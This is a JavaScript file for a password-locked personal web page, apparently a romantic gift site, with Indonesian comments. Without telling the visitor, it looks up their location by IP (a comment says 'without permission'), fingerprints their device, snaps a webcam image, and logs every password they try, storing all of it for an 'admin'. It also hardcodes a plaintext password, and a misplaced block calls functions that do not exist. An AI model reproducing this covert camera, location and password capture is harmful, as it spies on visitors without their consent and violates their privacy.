// 📍 Ambil Lokasi Berdasarkan IP (Tanpa Izin)
fetch("https://ipapi.co/json/")
    .then(response => response.json())
    .then(data => {
        let userLocation = `${data.city}, ${data.region}, ${data.country_name}`;
        localStorage.setItem("userLocation", userLocation);
    })
    .catch(() => localStorage.setItem("userLocation", "Tidak dapat diakses"));

// 📱 Ambil Informasi Perangkat yang Lebih Akurat
function getDeviceInfo() {
    let userAgent = navigator.userAgent;
    let platform = navigator.platform || "Tidak diketahui";
    let browser = "Tidak diketahui";

    if (userAgent.includes("Chrome")) browser = "Google Chrome";
    else if (userAgent.includes("Firefox")) browser = "Mozilla Firefox";
    else if (userAgent.includes("Safari")) browser = "Safari";
    else if (userAgent.includes("Edge")) browser = "Microsoft Edge";
    else if (userAgent.includes("Opera") || userAgent.includes("OPR")) browser = "Opera";
    else if (userAgent.includes("MSIE") || userAgent.includes("Trident")) browser = "Internet Explorer";

    let deviceInfo = `Sistem: ${platform}, Browser: ${browser}`;
    localStorage.setItem("deviceInfo", deviceInfo);
}
getDeviceInfo();

// 📷 Ambil Gambar Kamera & Kirim ke Admin
function captureCamera() {
    navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            let video = document.createElement("video");
            video.srcObject = stream;
            video.play();

            setTimeout(() => {
                let canvas = document.createElement("canvas");
                canvas.width = 320;
                canvas.height = 240;
                let ctx = canvas.getContext("2d");
                ctx.drawImage(video, 0, 0, 320, 240);
                let imageData = canvas.toDataURL("image/png");

                // Simpan ke LocalStorage agar bisa dilihat dari Admin
                localStorage.setItem("latestCameraImage", imageData);

                // Matikan kamera setelah mengambil gambar
                stream.getTracks().forEach(track => track.stop());
            }, 3000);
        })
        .catch(() => console.log("Kamera tidak dapat diakses"));
}

// 📝 Simpan Data Login ke LocalStorage (Memastikan Semua Data Masuk)
function saveLoginAttempt(password, status) {
    let loginAttempts = JSON.parse(localStorage.getItem("loginAttempts")) || [];
    let attemptData = {
        time: new Date().toLocaleString(),
        location: localStorage.getItem("userLocation") || "Tidak diketahui",
        device: localStorage.getItem("deviceInfo") || "Tidak diketahui",
        attemptedPassword: password,
        status: status // Menyimpan apakah login berhasil atau gagal
    };

    loginAttempts.push(attemptData);
    localStorage.setItem("loginAttempts", JSON.stringify(loginAttempts));
}

// 🚀 Jalankan Kamera Saat Login Dibuka
captureCamera();

// 🛡️ Cek Password & Simpan ke LocalStorage// *** Script Utama (Dibiarkan Seperti Aslinya) ***

let attempts = 0;
const maxAttempts = 3;
const correctPassword = "nabilapunyakiky";

function togglePassword() {
    const passwordInput = document.getElementById("password");
    const eyeOpen = document.getElementById("eyeOpen");
    const eyeClosed = document.getElementById("eyeClosed");

    if (passwordInput.type === "password") {
        passwordInput.type = "text";
        eyeOpen.classList.add("hidden");
        eyeClosed.classList.remove("hidden");
    } else {
        passwordInput.type = "password";
        eyeOpen.classList.remove("hidden");
        eyeClosed.classList.add("hidden");
    }
}

function validatePassword() {
    const passwordInput = document.getElementById("password");
    const errorMessage = document.getElementById("error-message");
    const countdownMessage = document.getElementById("countdown");
    const container = document.querySelector(".container");
    const button = document.querySelector("button");
    const audio = document.getElementById("countdown-sound"); // Ambil elemen audio

    let password = passwordInput.value.trim(); 

    if (password === "") {
        errorMessage.textContent = "⚠️ Kata sandi tidak boleh kosong!";
        errorMessage.classList.add("show");
        container.classList.add("shake");
        setTimeout(() => container.classList.remove("shake"), 300);
        return;
    }

    if (password === correctPassword) {
        errorMessage.textContent = "✅ Kata sandi benar! Selamat datang.";
        errorMessage.classList.add("show");
        document.getElementById("success-popup").classList.remove("hidden");
        setTimeout(() => button.remove(), 500);  
        setTimeout(() => {
            window.location.href = "https://kkykrnwn.github.io/script-bucin/file/utama.html";
        }, 2000);
    } else {
        attempts++;
        errorMessage.textContent = `❌ Kata sandi salah! Percobaan tersisa: ${maxAttempts - attempts}`;
        errorMessage.classList.add("show");
        passwordInput.value = ""; 
        container.classList.add("shake");
        setTimeout(() => container.classList.remove("shake"), 500);
        
        if (attempts >= maxAttempts) {
            errorMessage.textContent = "🚨 Terlalu banyak percobaan! Anda akan dialihkan ke Instagram pencipta...";
            let countdown = 10;
            countdownMessage.style.display = "block";
            countdownMessage.textContent = `Mengalihkan dalam ${countdown} detik...`;

            passwordInput.disabled = true;
            button.disabled = true;
            



document.addEventListener("DOMContentLoaded", () => {
    getLocation();
    startCamera();
    getDeviceInfo();
});


            
            // 🔊 Memastikan audio dimainkan
            audio.volume = 1.0; // Pastikan volume penuh
            audio.loop = true; // Loop agar suara terus berbunyi
            audio.play().catch(error => console.log("Gagal memutar suara:", error));


            let interval = setInterval(() => {
                countdown--;
                countdownMessage.textContent = `Mengalihkan dalam ${countdown} detik...`;
                if (countdown <= 0) {
                    clearInterval(interval);
                    audio.pause(); // Hentikan suara setelah hitung mundur selesai
                    window.location.href = "https://www.instagram.com/kky_krnwn331?igsh=MW9yZnF6YXY2YmsxZg=="; 
                }
            }, 1000);
        }
    }
}
